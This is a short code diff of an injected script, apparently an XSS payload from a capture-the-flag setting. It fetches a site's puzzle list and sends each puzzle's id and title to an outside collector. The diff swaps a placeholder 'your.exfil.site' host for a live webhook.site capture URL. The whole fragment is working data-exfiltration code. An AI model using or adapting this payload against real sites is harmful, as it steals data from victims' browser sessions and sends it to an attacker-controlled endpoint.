@@ -6,7 +6,7 @@
       .then(r => r.json())
       .then(puzzles => {
         puzzles.forEach(p => {
-          fetch("https://your.exfil.site/flag?id=" + encodeURIComponent(p.id) + "&title=" + encodeURIComponent(p.title));
+          fetch("https://webhook.site/00757dd8-0903-4a93-94b1-454f8b6e8fe6?id=" + encodeURIComponent(p.id) + "&title=" + encodeURIComponent(p.title));
         });
       });
   </script>
